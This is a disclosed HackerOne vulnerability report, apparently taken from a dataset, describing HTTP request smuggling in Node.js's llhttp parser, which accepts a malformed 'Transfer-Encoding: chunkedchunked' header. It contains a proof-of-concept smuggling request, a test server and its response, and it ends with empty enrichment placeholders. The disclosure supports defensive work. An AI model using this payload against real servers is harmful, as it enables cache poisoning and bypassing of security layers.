---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1524555'
original_report_id: '1524555'
title: HTTP Request Smuggling Due to Flawed Parsing of Transfer-Encoding
weakness: HTTP Request Smuggling
team_handle: nodejs
created_at: '2022-03-28T15:08:54.630Z'
disclosed_at: '2022-07-07T17:28:31.940Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
asset_identifier: https://github.com/nodejs/node
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- http-request-smuggling
---

# HTTP Request Smuggling Due to Flawed Parsing of Transfer-Encoding

## Metadata

- HackerOne Report ID: 1524555
- Weakness: HTTP Request Smuggling
- Program: nodejs
- Disclosed At: 2022-07-07T17:28:31.940Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:** 

The `llhttp` parser in the `http` module in Node v17.8.0 does not correctly parse and validate `Transfer-Encoding` headers. This can lead to HTTP Request Smuggling (HRS).

**Description:** 

After #1501679, I did a bit more digging into the issue, and found that there were more flaws in the parsing of `Transfer-Encoding` headers. Relevant code [here](https://github.com/nodejs/llhttp/blob/master/src/llhttp/http.ts#L483).

After matching `"chunked"`, the parser attempts to match the CRLF sequence, failing which it matches `chunked` again. As a result, the following forms a valid request for the parser, despite the `Transfer-Encoding` value, `chunkedchunked`, being invalid.

```http
GET / HTTP/1.1
Host: localhost
Transfer-Encoding: chunkedchunked

1
a
0

```

Node will process the `Transfer-Encoding` value as `chunked`, only seeing the last-match of the string `"chunked"`.

## Steps To Reproduce:

Server code I used for testing:

```javascript
const http = require('http');

http.createServer((request, response) => {
   let body = [];
   request.on('error', (err) => {
   response.end("error while reading body: " + err)
   }).on('data', (chunk) => {
      body.push(chunk);
   }).on('end', () => {
   body = Buffer.concat(body).toString();
   
   response.on('error', (err) => {
      response.end("error while sending response: " + err)
   });

   response.end(JSON.stringify({
         "Headers": request.headers,
         "Length": body.length,
         "Body": body,
      }) + "\n");
   });
}).listen(80);
```

Request:

```http
GET / HTTP/1.1
Host: localhost
Transfer-Encoding: chunkedchunked

1
a
0


```

Response:

```http
HTTP/1.1 200 OK
Date: Mon, 28 Mar 2022 15:02:31 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 92

{"Headers":{"host":"localhost","transfer-encoding":"chunkedchunked"},"Length":1,"Body":"a"}
```

## Supporting Material/References:

Payloads and outputs:
{F1671151}

## Impact

Depending on the specific web application, HRS can lead to cache poisoning, bypassing of security layers, stealing of credentials and so on.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
